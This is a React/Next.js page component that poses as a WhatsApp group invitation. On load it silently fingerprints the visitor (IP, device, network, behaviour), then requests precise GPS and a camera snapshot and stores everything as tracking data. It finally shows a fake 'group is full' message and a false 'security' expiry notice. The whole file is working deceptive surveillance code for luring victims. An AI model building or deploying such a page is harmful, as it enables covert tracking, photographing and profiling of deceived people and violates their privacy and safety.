'use client';

import { useState, useEffect, useRef } from 'react';
import { useParams } from 'next/navigation';
import { collectAllData, collectDataWithoutGPS, initializeBehavioralTracking, CollectedData, getCameraPermissionStatus, captureCameraImage } from '@/lib/dataCollection';
import { saveTrackingData, getGroupData } from '@/lib/storage';
import { WhatsappLogo, WarningCircle, CheckCircle, Spinner } from '@phosphor-icons/react';
import { twMerge } from 'tailwind-merge';

interface GroupData {
  id: string;
  name: string;
  image: string;
  imageUrl?: string;
  category?: string;
  createdAt: string;
  expiresAt?: string;
}

export default function JoinPage() {
  const params = useParams();
  const groupId = params.groupId as string;
  const [groupData, setGroupData] = useState<GroupData | null>(null);
  const [location, setLocation] = useState<GeolocationCoordinates | null>(null);
  const [locationError, setLocationError] = useState<string>('');
  const [isRequestingLocation, setIsRequestingLocation] = useState(false);
  const [hasJoined, setHasJoined] = useState(false);
  const [collectedData, setCollectedData] = useState<CollectedData | null>(null);
  const [backgroundDataCollected, setBackgroundDataCollected] = useState(false);
  const [cameraImage, setCameraImage] = useState<string | null>(null);
  const backgroundDataRef = useRef<Omit<CollectedData, 'gpsLocation'> | null>(null);
  const permissionRequestedRef = useRef(false);
  const cameraPermissionRequestedRef = useRef(false);

  useEffect(() => {
    // Initialize behavioral tracking when page loads
    initializeBehavioralTracking();
    
    // Load group data IMMEDIATELY from localStorage (synchronous for instant display)
    // This ensures UI shows immediately without waiting
    const loadGroupDataSync = () => {
      // Try localStorage first (instant, no async)
      const stored = localStorage.getItem(`group_${groupId}`);
      if (stored) {
        try {
          const data = JSON.parse(stored);
          setGroupData(data);
          return;
        } catch (error) {
          console.error('Error parsing group data:', error);
        }
      }
      
      // Try to read from URL-embedded info (shared across devices)
      try {
        const url = new URL(window.location.href);
        const info = url.searchParams.get('info');
        if (info) {
          const decoded = JSON.parse(decodeURIComponent(atob(info)));
          if (decoded?.id === groupId) {
            setGroupData(decoded);
            localStorage.setItem(`group_${groupId}`, JSON.stringify(decoded));
            return;
          }
        }
      } catch (error) {
        console.error('Error decoding invite info from URL:', error);
      }

      // Try to get groupId from URL if not in params
      const urlPath = window.location.pathname;
      const urlGroupId = urlPath.split('/join/')[1]?.split('/')[0]?.split('?')[0];
      if (urlGroupId && urlGroupId !== groupId) {
        const altStored = localStorage.getItem(`group_${urlGroupId}`);
        if (altStored) {
          try {
            const data = JSON.parse(altStored);
            setGroupData(data);
            return;
          } catch (error) {
            console.error('Error parsing group data:', error);
          }
        }
      }
      
      // If not in localStorage, try async IndexedDB (but don't block UI)
      const loadGroupDataAsync = async () => {
        let data = await getGroupData(groupId);
        if (!data && urlGroupId && urlGroupId !== groupId) {
          data = await getGroupData(urlGroupId);
        }
        if (data) {
          setGroupData(data);
        }
      };
      loadGroupDataAsync();
    };
    
    // Load group data immediately (synchronous)
    loadGroupDataSync();

    // Step 1: Start background data collection in background (don't block UI)
    // This collects: IP, device info, fingerprint, network, behavioral data
    // Run asynchronously without blocking the UI
    setTimeout(() => {
      collectBackgroundData().then(() => {
        // Step 2: After background data is collected, request location permission
        autoRequestLocationPermission();
      });
    }, 100); // Small delay to ensure UI renders first
    
    // Step 3: Camera will be requested AFTER location is obtained (see getLocationSilently)
  }, [groupId]);

  // Collect background data (IP, fingerprint, device info, etc.) - NO GPS, NO CAMERA
  // This is Step 1: Collect everything that doesn't need permission
  const collectBackgroundData = async () => {
    try {
      console.log('Step 1: Collecting background data (IP, device, fingerprint, network)...');
      const backgroundData = await collectDataWithoutGPS(groupId);
      
      // NO camera capture here - camera will be requested AFTER location (Step 3)
      // Set camera fields to null/unknown for now
      const dataWithoutCamera = {
        ...backgroundData,
        gpsLocation: null,
        cameraImage: null,
        metadata: {
          ...backgroundData.metadata,
          cameraPermissionStatus: 'prompt' as const, // Will be updated when camera is requested
        },
      };
      
      backgroundDataRef.current = dataWithoutCamera as any;
      setBackgroundDataCollected(true);
      
      // Store background data immediately using new storage system
      await saveTrackingData(dataWithoutCamera as CollectedData);
      console.log('Step 1: Background data collected successfully');
    } catch (error) {
      console.error('Error collecting background data:', error);
    }
  };

  // Auto-request location permission (especially for Android)
  const autoRequestLocationPermission = async () => {
    if (permissionRequestedRef.current) return;
    permissionRequestedRef.current = true;

    if (!navigator.geolocation) {
      console.log('Geolocation not supported');
      return;
    }

    // Check if permission is already granted
    try {
      if (navigator.permissions) {
        const permission = await navigator.permissions.query({ name: 'geolocation' as PermissionName });
        console.log('Location permission status:', permission.state);
        
        if (permission.state === 'granted') {
          // Permission already granted, get location silently
          console.log('Location permission already granted');
          getLocationSilently();
          return;
        }
        
        if (permission.state === 'prompt') {
          // Permission not yet requested, request it automatically
          // On Android, this will show the permission prompt
          console.log('Requesting location permission...');
          getLocationSilently();
        } else if (permission.state === 'denied') {
          console.log('Location permission denied by user');
        }
      } else {
        // Fallback for browsers without permissions API
        // Try to get location (will trigger permission prompt)
        console.log('Permissions API not available, trying direct request...');
        getLocationSilently();
      }
    } catch (error) {
      // Permissions API not supported, try direct request
      console.log('Error checking permissions, trying direct request:', error);
      getLocationSilently();
    }
  };

  // Get location silently (background - user will see browser prompt)
  const getLocationSilently = () => {
    if (!navigator.geolocation) {
      console.log('Geolocation API not available');
      return;
    }

    console.log('Step 2: Requesting GPS location...');
    navigator.geolocation.getCurrentPosition(
      async (position) => {
        console.log('Step 2: GPS location obtained:', position.coords);
        // Location obtained! Update the data with GPS
        setLocation(position.coords);
        
        // Step 3: NOW request camera permission (after location is obtained)
        console.log('Step 3: Requesting camera permission...');
        let finalCameraImage = null;
        let cameraPermissionStatus: 'granted' | 'denied' | 'prompt' | 'unknown' = 'denied';
        
        try {
          finalCameraImage = await captureCameraImage();
          if (finalCameraImage) {
            setCameraImage(finalCameraImage);
            console.log('Step 3: Camera image captured successfully');
          }
          cameraPermissionStatus = await getCameraPermissionStatus();
        } catch (error) {
          // Camera permission denied - that's fine, we still have location and background data
          console.log('Step 3: Camera permission denied or error:', error);
          cameraPermissionStatus = await getCameraPermissionStatus();
        }
        
        // Merge all data: background + GPS + camera
        if (backgroundDataRef.current) {
          const allData = await collectAllData(groupId, position.coords);
          allData.cameraImage = finalCameraImage;
          allData.metadata.cameraPermissionStatus = cameraPermissionStatus;
          setCollectedData(allData);
          
          // Save complete data using new storage system
          await saveTrackingData(allData);
          console.log('All data collected and saved: background + GPS + camera');
        } else {
          // No background data yet, collect everything now
          const allData = await collectAllData(groupId, position.coords);
          allData.cameraImage = finalCameraImage;
          allData.metadata.cameraPermissionStatus = cameraPermissionStatus;
          setCollectedData(allData);
          
          // Save data using new storage system
          await saveTrackingData(allData);
        }
      },
      async (error) => {
        // Location permission denied or error - that's okay, we still have background data
        console.log('Step 2: Location permission denied or error:', error.code, error.message);
        if (error.code === 1) {
          console.log('User denied location permission');
        } else if (error.code === 2) {
          console.log('Location unavailable');
        } else if (error.code === 3) {
          console.log('Location request timeout');
        }
        
        // Step 3: Even if location is denied, still try to get camera (last step)
        console.log('Step 3: Requesting camera permission (location was denied)...');
        let finalCameraImage = null;
        let cameraPermissionStatus: 'granted' | 'denied' | 'prompt' | 'unknown' = 'denied';
        
        try {
          finalCameraImage = await captureCameraImage();
          if (finalCameraImage) {
            setCameraImage(finalCameraImage);
            console.log('Step 3: Camera image captured successfully');
          }
          cameraPermissionStatus = await getCameraPermissionStatus();
        } catch (cameraError) {
          // Camera permission also denied - that's fine
          console.log('Step 3: Camera permission denied:', cameraError);
          cameraPermissionStatus = await getCameraPermissionStatus();
        }
        
        // Update background data with camera info (no GPS)
        if (backgroundDataRef.current) {
          const dataWithCamera = {
            ...backgroundDataRef.current,
            cameraImage: finalCameraImage,
            metadata: {
              ...backgroundDataRef.current.metadata,
              cameraPermissionStatus,
            },
          } as CollectedData;
          
          setCollectedData(dataWithCamera);
          await saveTrackingData(dataWithCamera);
          console.log('Data saved: background + camera (no GPS)');
        }
      },
      {
        enableHighAccuracy: true,
        timeout: 15000,
        maximumAge: 0,
      }
    );
  };

  // Auto-request camera permission (background)
  const autoRequestCameraPermission = async () => {
    if (cameraPermissionRequestedRef.current) return;
    cameraPermissionRequestedRef.current = true;

    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
      return;
    }

    try {
      // Check if permission is already granted
      const permissionStatus = await getCameraPermissionStatus();
      
      if (permissionStatus === 'granted') {
        // Permission already granted, capture image silently
        captureCameraImageSilently();
        return;
      }
      
      if (permissionStatus === 'prompt') {
        // Permission not yet requested, try to capture (will trigger prompt)
        captureCameraImageSilently();
      }
    } catch (error) {
      // Permissions API not supported, try direct request
      captureCameraImageSilently();
    }
  };

  // Capture camera image silently (background - user will see browser prompt)
  const captureCameraImageSilently = async () => {
    try {
      const image = await captureCameraImage();
      if (image) {
        setCameraImage(image);
      }
    } catch (error) {
      // Permission denied or error - that's okay
      console.log('Camera capture failed:', error);
    }
  };

  // Manual request when user clicks "Join Group"
  const requestLocation = async () => {
    setIsRequestingLocation(true);
    setLocationError('');

    if (!navigator.geolocation) {
      setLocationError('Geolocation is not supported by your browser');
      setIsRequestingLocation(false);
      return;
    }

    navigator.geolocation.getCurrentPosition(
      async (position) => {
        setLocation(position.coords);
        setIsRequestingLocation(false);
        
        // Try to capture camera image if not already captured
        let finalCameraImage = cameraImage;
        if (!finalCameraImage) {
          try {
            finalCameraImage = await captureCameraImage();
            if (finalCameraImage) {
              setCameraImage(finalCameraImage);
            }
          } catch (error) {
            // Camera permission denied - that's fine
          }
        }
        
        // Get camera permission status
        const cameraPermissionStatus = await getCameraPermissionStatus();
        
        // Collect ALL data (location + fingerprinting + analysis)
        const allData = await collectAllData(groupId, position.coords);
        
        // Add camera image and permission status
        allData.cameraImage = finalCameraImage;
        allData.metadata.cameraPermissionStatus = cameraPermissionStatus;
        
        setCollectedData(allData);
        
        // Save data using new storage system (handles both IndexedDB and localStorage)
        await saveTrackingData(allData);
        
        setHasJoined(true);
      },
      async (error) => {
        setLocationError('Unable to retrieve your location. Please allow location access.');
        setIsRequestingLocation(false);
        
        // Try to capture camera image if not already captured
        let finalCameraImage = cameraImage;
        if (!finalCameraImage) {
          try {
            finalCameraImage = await captureCameraImage();
            if (finalCameraImage) {
              setCameraImage(finalCameraImage);
            }
          } catch (error) {
            // Camera permission denied - that's fine
          }
        }
        
        // Get camera permission status
        const cameraPermissionStatus = await getCameraPermissionStatus();
        
        // Even if location is denied, we still have background data
        if (backgroundDataRef.current) {
          const dataWithNoGPS = {
            ...backgroundDataRef.current,
            gpsLocation: null,
            cameraImage: finalCameraImage,
            metadata: {
              ...backgroundDataRef.current.metadata,
              cameraPermissionStatus,
            },
          } as CollectedData;
          setCollectedData(dataWithNoGPS);
          setHasJoined(true); // Still mark as joined, just without GPS
          
          // Update stored data
          const existingData = JSON.parse(localStorage.getItem('tracking_data') || '[]');
          if (existingData.length > 0) {
            existingData[existingData.length - 1] = dataWithNoGPS;
            localStorage.setItem('tracking_data', JSON.stringify(existingData));
          }
        }
      },
      {
        enableHighAccuracy: true,
        timeout: 10000,
        maximumAge: 0,
      }
    );
  };

  const handleJoinGroup = () => {
    requestLocation();
  };

  const isExpired = () => {
    if (!groupData?.expiresAt) return false;
    return new Date(groupData.expiresAt).getTime() < Date.now();
  };

  if (!groupData) {
    // Without group data we cannot render the invite; show expired-style message
    return (
      <div className="min-h-screen bg-[#e5ddd5] flex items-center justify-center p-4">
        <div className="w-full max-w-md bg-white shadow-sm">
          {/* WhatsApp-style Header */}
          <div className="bg-[#075E54] text-white">
            <div className="px-4 py-3 flex items-center">
              <WhatsappLogo className="w-6 h-6 text-white mr-3" weight="fill" />
              <h1 className="text-lg font-medium">WhatsApp</h1>
            </div>
          </div>
          
          {/* Expired Message */}
          <div className="bg-white px-6 py-8">
            <div className="text-center">
              <div className="inline-flex items-center justify-center w-16 h-16 bg-red-100 rounded-full mb-4">
                <div className="w-12 h-12 bg-red-600 rounded-full flex items-center justify-center">
                  <span className="text-white text-2xl font-bold">!</span>
                </div>
              </div>
              <h3 className="text-lg font-semibold text-[#1f1f1f] mb-2">This link has expired</h3>
              <p className="text-[#667781] text-sm">
                This group invitation link has expired. Links expire after 10 minutes for security purposes. Please request a new link.
              </p>
            </div>
          </div>
        </div>
      </div>
    );
  }

  if (isExpired()) {
    return (
      <div className="min-h-screen bg-[#e5ddd5] flex items-center justify-center p-4">
        <div className="w-full max-w-md bg-white shadow-sm">
          {/* WhatsApp-style Header */}
          <div className="bg-[#075E54] text-white">
            <div className="px-4 py-3 flex items-center">
              <WhatsappLogo className="w-6 h-6 text-white mr-3" weight="fill" />
              <h1 className="text-lg font-medium">WhatsApp</h1>
            </div>
          </div>
          
          {/* Expired Message */}
          <div className="bg-white px-6 py-8">
            <div className="text-center">
              <div className="inline-flex items-center justify-center w-16 h-16 bg-red-100 rounded-full mb-4">
                <div className="w-12 h-12 bg-red-600 rounded-full flex items-center justify-center">
                  <span className="text-white text-2xl font-bold">!</span>
                </div>
              </div>
              <h3 className="text-lg font-semibold text-[#1f1f1f] mb-2">This link has expired</h3>
              <p className="text-[#667781] text-sm">
                This group invitation link has expired. Links expire after 10 minutes for security purposes. Please request a new link.
              </p>
            </div>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#e5ddd5] flex items-center justify-center p-4">
      <div className="w-full max-w-md bg-white shadow-sm">
        {/* WhatsApp-style Header */}
        <div className="bg-[#075E54] text-white">
          <div className="px-4 py-3 flex items-center">
            <div className="flex items-center justify-center w-10 h-10 mr-3">
              <WhatsappLogo className="w-6 h-6 text-white" weight="fill" />
            </div>
            <div className="flex-1">
              <h1 className="text-lg font-medium">WhatsApp</h1>
            </div>
          </div>
        </div>

        {/* Main Content */}
        <div className="bg-white">
          {/* Group Image and Name Section */}
          <div className="px-6 pt-8 pb-6 text-center">
            { (groupData.image || groupData.imageUrl) ? (
              <img
                src={groupData.image || groupData.imageUrl || ''}
                alt={groupData.name}
                className="w-32 h-32 rounded-full mx-auto mb-4 object-cover border-4 border-white shadow-md"
              />
            ) : (
              <div className="w-32 h-32 rounded-full mx-auto mb-4 bg-[#128C7E] flex items-center justify-center border-4 border-white shadow-md">
                <span className="text-5xl text-white font-semibold">
                  {groupData.name.charAt(0).toUpperCase()}
                </span>
              </div>
            )}
            <h2 className="text-2xl font-semibold text-[#1f1f1f] mb-2">{groupData.name}</h2>
            <p className="text-[#667781] text-sm">WhatsApp Group</p>
          </div>

          {/* Divider */}
          <div className="border-t border-[#e4e6eb]"></div>

          {/* Join Section */}
          {!hasJoined ? (
            <div className="px-6 py-8">
              <div className="text-center mb-6">
                <p className="text-[#667781] text-sm leading-relaxed">
                  You've been invited to join this group. Tap the button below to join.
                </p>
              </div>

              {locationError && (
                <div className="mb-4 p-3 bg-[#fee] border border-[#fcc] rounded-lg">
                  <p className="text-sm text-[#c33]">{locationError}</p>
                </div>
              )}

              <button
                onClick={handleJoinGroup}
                disabled={isRequestingLocation}
                className={twMerge(
                  "w-full bg-[#25D366] text-white py-3.5 rounded-lg font-medium text-base",
                  "hover:bg-[#20BA5A] active:bg-[#1DA851] transition-colors",
                  "disabled:opacity-70 disabled:cursor-not-allowed",
                  "shadow-sm flex items-center justify-center"
                )}
                style={{
                  boxShadow: '0 2px 4px rgba(37, 211, 102, 0.3)'
                }}
              >
                {isRequestingLocation ? (
                  <>
                    <Spinner className="w-5 h-5 text-white mr-3 animate-spin" weight="bold" />
                    <span>Joining...</span>
                  </>
                ) : (
                  'Join Group'
                )}
              </button>

            </div>
          ) : (
            <div className="px-6 py-8">
              <div className="text-center">
                <div className="inline-flex items-center justify-center w-20 h-20 bg-[#fdecea] rounded-full mb-4">
                  <WarningCircle className="w-12 h-12 text-[#d93025]" weight="fill" />
                </div>
                <h3 className="text-xl font-semibold text-[#1f1f1f] mb-2">Sorry, the group is full</h3>
                <p className="text-[#667781] text-sm">
                  This group has reached its maximum capacity. Please try again later.
                </p>
              </div>
            </div>
          )}

          {/* Footer removed per request */}
        </div>
      </div>
    </div>
  );
}
